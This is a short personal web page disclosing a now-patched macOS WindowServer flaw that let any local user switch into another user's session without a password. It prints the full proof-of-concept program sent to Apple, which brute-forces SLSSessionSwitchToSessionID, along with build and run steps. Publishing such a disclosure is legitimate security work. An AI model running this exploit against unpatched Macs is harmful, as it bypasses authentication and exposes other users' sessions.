<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="initial-scale=0.8">
<link rel="stylesheet" href="/common/style.css">
<title>green ball</title>
</head>
<body>
<div id="container">
<div id="headerOuter" class="divOuter">
<div id="headerInner" class="divInner">
<h1><a href="/">ASentientBot</a></h1>
<a href="mailto:asentientbot@gmail.com">asentientbot@gmail.com</a> ‚Ä¢ ASentientBot#0323 ‚Ä¢ <a target="_blank" href="https://asentientbot.ca/@a">@a@asentientbot.ca</a>
</div>
</div>
<div id="bodyOuter" class="divOuter">
<div id="bodyInner" class="divInner">
<h1>SkyLight user session exploit</h1>
While working on <a href="/bigsur">non-Metal acceleration</a> in 2021, I stumbled on a WindowServer bug allowing any user to switch to another user's session without entering their password. Apple fixed the bug in macOS <a target="_blank" href="https://support.apple.com/en-ca/HT212872">11.6.1</a> and <a target="_blank" href="https://support.apple.com/en-ca/HT212869">12.0.1</a> and paid me a generous bounty.
<br>
<br><img alt="" src="/sessions/bigsur.png"/>
<br><img alt="" src="/sessions/monterey.png"/>
<br>
<br><h2>thanks</h2>
<a target="_blank" href="https://github.com/moosethegoose2213">ASentientHedgehog</a> tested an early version. <a target="_blank" href="https://twitter.com/916253">Emma (916253)</a> tested on numerous betas, encouraged me to report the bug, and gave great advice along the way.
<br>
<br><h2>code</h2>
This is the program I submitted to Apple. It simply brute-forces <code>SLSSessionSwitchToSessionID</code>, which lacked any entitlement or privilege check.
<br>
<br><code>// clang -fmodules -F /System/Library/PrivateFrameworks -framework SkyLight thing.m -o thing

@import Foundation;

void SLSSessionSwitchToSessionID(int);
NSDictionary* SLSCopyCurrentSessionDictionary();
extern NSString* kCGSSessionOnConsoleKey;

int main()
{
	for(int guess=0;;guess++)
	{
		NSDictionary* dict=SLSCopyCurrentSessionDictionary();
		if([dict[kCGSSessionOnConsoleKey] isEqual:@false])
		{
			printf("üòÅ\n");
			return 0;
		}
		dict.release;
		
		SLSSessionSwitchToSessionID(guess);
	}
}</code>
<br>
<br>Run it from Guest or a second user, and (on a vulnerable version) it should transition to the other session after a few seconds.
</div>
</div>
</div>
</body>
</html>